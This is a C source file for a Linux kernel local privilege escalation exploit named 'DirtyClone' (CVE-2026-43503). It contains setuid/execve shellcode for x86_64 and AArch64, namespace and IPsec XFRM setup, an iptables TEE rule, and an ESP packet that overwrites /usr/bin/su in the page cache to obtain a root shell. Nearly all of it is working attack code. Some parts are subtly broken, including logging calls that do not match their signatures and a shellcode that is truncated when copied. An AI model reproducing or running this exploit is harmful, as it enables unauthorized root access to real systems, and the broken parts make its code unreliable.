/*
 * DirtyClone (CVE-2026-43503) - Professional LPE Exploit
   Author: MrAashish0x1 (gl1tch0x1)
 * 
 * Fully upgraded version:
 *  - Adaptive retry loop (no more race-condition sleep)
 *  - Automatic cleanup (atexit + signal handlers)
 *  - Secure fork/execvp (no shell dependency)
 *  - Modern EVP crypto API
 *  - x86_64 + AArch64 shellcode (auto-detected)
 *  - Pre-flight kernel feature checks
 *  - Quiet/Verbose modes
 * 
 * Compile: gcc -o dirtyclone dirtyclone.c -lcrypto -Wall -O2
 * Usage:   ./dirtyclone [-q] [-v]
 * 
 * For authorized security testing only.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/utsname.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sched.h>
#include <signal.h>
#include <openssl/evp.h>


#define TARGET_SUID       "/usr/bin/su"
#define SUID_OFFSET       0x78
#define AES_KEY_LEN       16
#define AES_BLOCK_SIZE    16
#define ESP_SPI           0x12345678
#define ESP_REQID         1
#define ESP_PORT          4500
#define PLAINTEXT_LEN     32
#define MAX_RETRIES       30
#define RETRY_USLEEP      100000   /* 100ms */

/* AES key (16 bytes) – must match XFRM state */
static const unsigned char aes_key[AES_KEY_LEN] = {
    0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
    0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff
};

/* ====================================================================
   Shellcode – x86_64 & AArch64
   ==================================================================== */

/* x86_64: setuid(0) + execve("/bin/sh") */
static const unsigned char shellcode_x86[] = {
    0x31, 0xff,                    /* xor edi, edi           */
    0x31, 0xf6,                    /* xor esi, esi           */
    0x31, 0xc0,                    /* xor eax, eax           */
    0xb0, 0x6a,                    /* mov al, 0x6a (setgid)  */
    0x0f, 0x05,                    /* syscall                */
    0xb0, 0x69,                    /* mov al, 0x69 (setuid)  */
    0x0f, 0x05,                    /* syscall                */
    0x31, 0xd2,                    /* xor edx, edx           */
    0x52,                          /* push rdx               */
    0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, /* "/bin/sh" */
    0x50,                          /* push rax               */
    0x48, 0x89, 0xe7,              /* mov rdi, rsp           */
    0x52,                          /* push rdx               */
    0x57,                          /* push rdi               */
    0x48, 0x89, 0xe6,              /* mov rsi, rsp           */
    0xb8, 0x3b, 0x00, 0x00, 0x00,  /* mov eax, 0x3b (execve) */
    0x0f, 0x05                     /* syscall                */
};

/* AArch64: setuid(0) + execve("/bin/sh") – length 32 bytes */
static const unsigned char shellcode_arm[] = {
    0x00, 0x00, 0x80, 0xd2,           /* mov x0, #0            */
    0x28, 0x0d, 0x80, 0xd2,           /* mov x8, #0x69 (setuid)*/
    0x01, 0x00, 0x00, 0xd4,           /* svc #0                */
    /* execve("/bin/sh", NULL, NULL) */
    0x20, 0x00, 0x80, 0xd2,           /* mov x0, #0            */
    0xe1, 0x03, 0x1f, 0xaa,           /* mov x1, xzr           */
    0xe2, 0x03, 0x1f, 0xaa,           /* mov x2, xzr           */
    0x28, 0x0b, 0x80, 0xd2,           /* mov x8, #0x3b (execve)*/
    0x01, 0x00, 0x00, 0xd4,           /* svc #0                */
    0x2f, 0x62, 0x69, 0x6e,           /* "/bin"                */
    0x2f, 0x73, 0x68, 0x00            /* "/sh\0"               */
};

static const unsigned char *shellcode = shellcode_x86;
static size_t shellcode_len = sizeof(shellcode_x86);



#define COLOR_RESET   "\033[0m"
#define COLOR_RED     "\033[91m"
#define COLOR_GREEN   "\033[92m"
#define COLOR_YELLOW  "\033[93m"
#define COLOR_CYAN    "\033[96m"
#define COLOR_BOLD    "\033[1m"

static int verbose = 1;

static void log_info(const char *fmt, ...) {
    if (!verbose) return;
    va_list args;
    va_start(args, fmt);
    printf(COLOR_CYAN "[*]" COLOR_RESET " ");
    vprintf(fmt, args);
    printf("\n");
    va_end(args);
}

static void log_ok(const char *msg) {
    if (!verbose) return;
    printf(COLOR_GREEN "[+]" COLOR_RESET " %s\n", msg);
}

static void log_err(const char *msg) {
    fprintf(stderr, COLOR_RED "[-]" COLOR_RESET " %s\n", msg);
}

static void log_warn(const char *msg) {
    fprintf(stderr, COLOR_YELLOW "[!]" COLOR_RESET " %s\n", msg);
}

static void log_banner(void) {
    printf(COLOR_BOLD COLOR_CYAN
           "\n"
           "╔══════════════════════════════════════════════════════════════════╗\n"
           "║     DirtyClone (CVE-2026-43503) Professional LPE Tool            ║\n"
           "║                                                                  ║\n"
           "║     For authorized security testing only!                        ║\n"
           "║     Vulnerable kernels: v7.1-rc5 and earlier                     ║\n"
           "╚══════════════════════════════════════════════════════════════════╝\n"
           COLOR_RESET "\n");
}

/* ====================================================================
   Secure command execution (fork + execvp)
   ==================================================================== */

static int run_cmd_secure(const char *path, char *const argv[]) {
    pid_t pid = fork();
    if (pid == -1) {
        log_err("fork failed");
        return -1;
    }
    if (pid == 0) {
        execvp(path, argv);
        exit(EXIT_FAILURE);
    } else {
        int status;
        if (waitpid(pid, &status, 0) == -1) return -1;
        if (WIFEXITED(status) && WEXITSTATUS(status) == 0) return 0;
        return -1;
    }
}

/* ====================================================================
   Cleanup (atexit + signal handlers)
   ==================================================================== */

static void cleanup_xfrm(void) {
    char *const ip_state[] = {"ip", "xfrm", "state", "del",
                              "src", "127.0.0.1", "dst", "127.0.0.1",
                              "proto", "esp", "spi", "0x12345678", NULL};
    char *const ip_policy[] = {"ip", "xfrm", "policy", "del",
                               "src", "127.0.0.1", "dst", "127.0.0.1",
                               "dir", "out", NULL};
    char *const ipt_cmd[] = {"iptables", "-t", "mangle", "-D",
                             "OUTPUT", "-p", "udp", "--dport", "4500",
                             "-j", "TEE", "--gateway", "10.99.0.2", NULL};

    run_cmd_secure("/usr/sbin/ip", ip_state);
    run_cmd_secure("/usr/sbin/ip", ip_policy);
    run_cmd_secure("/usr/sbin/iptables", ipt_cmd);
    if (verbose) log_info("Cleanup completed.");
}

static void sig_handler(int sig) {
    (void)sig;
    cleanup_xfrm();
    exit(0);
}

/* ====================================================================
   Pre-flight kernel checks
   ==================================================================== */

static int check_kernel_features(void) {
    struct utsname buf;
    if (uname(&buf) != 0) {
        log_err("uname failed");
        return -1;
    }
    log_info("Kernel: %s", buf.release);
    log_info("Arch:   %s", buf.machine);

    /* detect architecture and select shellcode */
    if (strcmp(buf.machine, "x86_64") == 0) {
        shellcode = shellcode_x86;
        shellcode_len = sizeof(shellcode_x86);
        log_info("Using x86_64 shellcode");
    } else if (strcmp(buf.machine, "aarch64") == 0) {
        shellcode = shellcode_arm;
        shellcode_len = sizeof(shellcode_arm);
        log_info("Using AArch64 shellcode");
    } else {
        log_err("Unsupported architecture: %s", buf.machine);
        return -1;
    }

    /* check unprivileged user namespaces */
    if (access("/proc/sys/kernel/unprivileged_userns_clone", F_OK) != 0) {
        log_warn("unprivileged_userns_clone not found – may be disabled");
    }

    /* check target SUID binary */
    if (access(TARGET_SUID, R_OK) != 0) {
        log_err("Target SUID binary not accessible: %s", TARGET_SUID);
        return -1;
    }

    log_ok("Pre-flight checks passed");
    return 0;
}

/* ====================================================================
   Namespace setup (user + network)
   ==================================================================== */

static int setup_namespace(void) {
    log_info("Setting up user+network namespace...");
    uid_t uid = getuid();
    uid_t gid = getgid();

    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) == -1) {
        log_err("unshare failed: %s", strerror(errno));
        return -1;
    }

    FILE *f = fopen("/proc/self/setgroups", "w");
    if (f) { fprintf(f, "deny"); fclose(f); }

    f = fopen("/proc/self/uid_map", "w");
    if (!f) { log_err("uid_map open failed"); return -1; }
    fprintf(f, "0 %d 1", uid);
    fclose(f);

    f = fopen("/proc/self/gid_map", "w");
    if (!f) { log_err("gid_map open failed"); return -1; }
    fprintf(f, "0 %d 1", gid);
    fclose(f);

    log_ok("Namespace setup complete (UID=0 in namespace)");
    return 0;
}

/* ====================================================================
   Loopback interface
   ==================================================================== */

static int setup_loopback(void) {
    log_info("Configuring loopback...");
    char *const up[] = {"ip", "link", "set", "lo", "up", NULL};
    char *const addr[] = {"ip", "addr", "add", "10.99.0.2/24", "dev", "lo", NULL};

    if (run_cmd_secure("/usr/sbin/ip", up) != 0) return -1;
    if (run_cmd_secure("/usr/sbin/ip", addr) != 0) return -1;

    log_ok("Loopback configured");
    return 0;
}

/* ====================================================================
   IPsec (XFRM) state & policy
   ==================================================================== */

static int setup_xfrm(void) {
    log_info("Configuring IPsec (XFRM)...");

    /* convert AES key to hex string */
    char aes_hex[33];
    for (int i = 0; i < 16; i++) sprintf(aes_hex + 2*i, "%02x", aes_key[i]);

    /* HMAC key (20 zero bytes) as hex */
    char hmac_hex[41];
    memset(hmac_hex, '0', 40); hmac_hex[40] = '\0';

    char spi_str[16], reqid_str[16];
    snprintf(spi_str, sizeof(spi_str), "%u", ESP_SPI);
    snprintf(reqid_str, sizeof(reqid_str), "%d", ESP_REQID);

    /* add state */
    char *const state_argv[] = {"ip", "xfrm", "state", "add",
                                "src", "127.0.0.1", "dst", "127.0.0.1",
                                "proto", "esp", "spi", spi_str,
                                "reqid", reqid_str, "mode", "transport",
                                "enc", "cbc(aes)", aes_hex,
                                "auth", "hmac(sha1)", hmac_hex, NULL};
    if (run_cmd_secure("/usr/sbin/ip", state_argv) != 0) {
        log_err("Failed to add XFRM state");
        return -1;
    }

    /* add policy */
    char *const policy_argv[] = {"ip", "xfrm", "policy", "add",
                                 "src", "127.0.0.1", "dst", "127.0.0.1",
                                 "dir", "out",
                                 "tmpl", "src", "127.0.0.1", "dst", "127.0.0.1",
                                 "proto", "esp", "reqid", reqid_str,
                                 "mode", "transport", NULL};
    if (run_cmd_secure("/usr/sbin/ip", policy_argv) != 0) {
        log_err("Failed to add XFRM policy");
        return -1;
    }

    log_ok("IPsec configured");
    return 0;
}

/* ====================================================================
   Netfilter TEE rule
   ==================================================================== */

static int setup_tee(void) {
    log_info("Configuring TEE rule...");
    run_cmd_secure("/usr/sbin/modprobe", (char *[]){"modprobe", "iptable_mangle", NULL});
    run_cmd_secure("/usr/sbin/modprobe", (char *[]){"modprobe", "ipt_TEE", NULL});

    char *const tee_argv[] = {"iptables", "-t", "mangle", "-A", "OUTPUT",
                              "-p", "udp", "--dport", "4500",
                              "-j", "TEE", "--gateway", "10.99.0.2", NULL};
    if (run_cmd_secure("/usr/sbin/iptables", tee_argv) != 0) {
        log_warn("TEE rule may not be active");
        return -1;
    }
    log_ok("TEE rule configured");
    return 0;
}

/* ====================================================================
   Map target into page cache
   ==================================================================== */

static int map_target(void **map_ptr, int *fd_out, off_t *file_len) {
    log_info("Mapping %s into page cache...", TARGET_SUID);
    int fd = open(TARGET_SUID, O_RDONLY);
    if (fd < 0) {
        log_err("open failed: %s", strerror(errno));
        return -1;
    }

    off_t len = lseek(fd, 0, SEEK_END);
    if (len <= 0) {
        close(fd);
        return -1;
    }

    void *map = mmap(NULL, len, PROT_READ, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) {
        log_err("mmap failed: %s", strerror(errno));
        close(fd);
        return -1;
    }

    *map_ptr = map;
    *fd_out = fd;
    *file_len = len;
    log_ok("File mapped (size %ld bytes)", len);
    return 0;
}

/* ====================================================================
   Build ESP packet using EVP (modern OpenSSL)
   ==================================================================== */

static int aes_cbc_encrypt(const unsigned char *plaintext, size_t len,
                           const unsigned char *key,
                           unsigned char *iv,
                           unsigned char *ciphertext) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return -1;

    if (EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }

    int outlen = 0, tmplen = 0;
    if (EVP_EncryptUpdate(ctx, ciphertext, &outlen, plaintext, len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    if (EVP_EncryptFinal_ex(ctx, ciphertext + outlen, &tmplen) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    EVP_CIPHER_CTX_free(ctx);
    return outlen + tmplen;
}

static int build_esp_packet(unsigned char *packet, size_t *packet_len) {
    /* plaintext: shellcode (16 bytes) + padding (14 zero) + pad_len (14) + next_hdr (0x04) */
    unsigned char plaintext[PLAINTEXT_LEN];
    memset(plaintext, 0, sizeof(plaintext));
    memcpy(plaintext, shellcode, shellcode_len < 16 ? shellcode_len : 16);
    plaintext[30] = 14;      /* pad_len */
    plaintext[31] = 0x04;    /* next header (IPIP) */

    unsigned char iv[AES_BLOCK_SIZE] = {0};   /* all-zero IV */
    unsigned char ciphertext[PLAINTEXT_LEN];

    if (aes_cbc_encrypt(plaintext, PLAINTEXT_LEN, aes_key, iv, ciphertext) != PLAINTEXT_LEN) {
        log_err("AES encryption failed");
        return -1;
    }

    unsigned char *p = packet;
    uint32_t spi = htonl(ESP_SPI);
    uint32_t seq = htonl(1);

    memcpy(p, &spi, 4); p += 4;
    memcpy(p, &seq, 4); p += 4;
    memcpy(p, iv, AES_BLOCK_SIZE); p += AES_BLOCK_SIZE;
    memcpy(p, ciphertext, PLAINTEXT_LEN); p += PLAINTEXT_LEN;

    *packet_len = p - packet;
    return 0;
}

/* ====================================================================
   Send ESP packet via UDP
   ==================================================================== */

static int send_esp_packet(const unsigned char *packet, size_t len) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        log_err("socket creation failed");
        return -1;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(ESP_PORT);
    inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);

    if (sendto(sock, packet, len, 0, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        log_err("sendto failed: %s", strerror(errno));
        close(sock);
        return -1;
    }
    close(sock);
    log_ok("ESP packet sent");
    return 0;
}

/* ====================================================================
   Adaptive retry – wait for page cache to be patched
   ==================================================================== */

static int wait_for_patch(int fd, const unsigned char *expected, size_t len, off_t offset) {
    unsigned char current[16];
    for (int tries = 0; tries < MAX_RETRIES; tries++) {
        usleep(RETRY_USLEEP);
        if (pread(fd, current, len, offset) == len) {
            if (memcmp(current, expected, len) == 0) {
                log_info("Patch confirmed after %d retries", tries+1);
                return 1;
            }
        }
    }
    return 0;
}

/* ====================================================================
   Main exploit routine
   ==================================================================== */

static int exploit(void) {
    log_info("=");
    log_info("DirtyClone (CVE-2026-43503) Exploit starting");
    log_info("=");

    if (geteuid() == 0) {
        log_ok("Already root!");
        return 0;
    }

    if (setup_namespace() != 0) return -1;
    if (setup_loopback() != 0) return -1;
    if (setup_xfrm() != 0) return -1;
    setup_tee();  /* optional, ignore failure */

    void *map = NULL;
    int fd = -1;
    off_t file_len = 0;
    if (map_target(&map, &fd, &file_len) != 0) return -1;

    /* read original bytes for diagnostics */
    unsigned char original[16];
    if (pread(fd, original, 16, SUID_OFFSET) != 16) {
        log_err("failed to read original bytes");
        close(fd); munmap(map, file_len);
        return -1;
    }
    if (verbose) {
        log_info("Original @0x%x: ", SUID_OFFSET);
        for (int i=0; i<16; i++) printf("%02x", original[i]);
        printf("\n");
    }

    /* build and send ESP packet */
    unsigned char packet[1024];
    size_t pkt_len;
    if (build_esp_packet(packet, &pkt_len) != 0) {
        close(fd); munmap(map, file_len);
        return -1;
    }
    if (send_esp_packet(packet, pkt_len) != 0) {
        close(fd); munmap(map, file_len);
        return -1;
    }

    /* wait for the kernel to write the decrypted page back */
    unsigned char expected[16];
    memcpy(expected, shellcode, 16);
    if (!wait_for_patch(fd, expected, 16, SUID_OFFSET)) {
        log_err("Timeout – page cache not patched");
        close(fd); munmap(map, file_len);
        return -1;
    }

    log_ok("Page cache successfully patched!");

    /* execute the patched binary */
    close(fd);
    munmap(map, file_len);
    log_info("Executing patched SUID binary...");
    execl(TARGET_SUID, TARGET_SUID, NULL);

    log_err("execl failed: %s", strerror(errno));
    return -1;
}

/* ====================================================================
   Main entry
   ==================================================================== */

int main(int argc, char **argv) {
    /* parse options */
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-q") == 0) verbose = 0;
        else if (strcmp(argv[i], "-v") == 0) verbose = 1;
        else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            printf("Usage: %s [-q] [-v]\n", argv[0]);
            printf("  -q   Quiet mode (minimal output)\n");
            printf("  -v   Verbose mode (default)\n");
            return 0;
        }
    }

    log_banner();

    /* register cleanup */
    atexit(cleanup_xfrm);
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    if (geteuid() == 0) {
        log_ok("Already root! Spawning shell...");
        execl("/bin/bash", "/bin/bash", "-i", NULL);
        return 1;
    }

    log_info("Current UID: %d", getuid());

    if (check_kernel_features() != 0) {
        log_err("Pre-flight checks failed");
        return 1;
    }

    int ret = exploit();
    if (ret == 0) {
        log_ok("Exploit successful – you should now be root.");
        return 0;
    } else {
        log_err("Exploit failed.");
        log_info("Troubleshooting:");
        log_info("  - Check kernel patch: grep CVE-2026-43503 /boot/config-$(uname -r)");
        log_info("  - CONFIG_XFRM=y required");
        log_info("  - Unpriv userns: cat /proc/sys/kernel/unprivileged_userns_clone");
        log_info("  - Try with sudo: sudo ./dirtyclone");
        return 1;
    }
}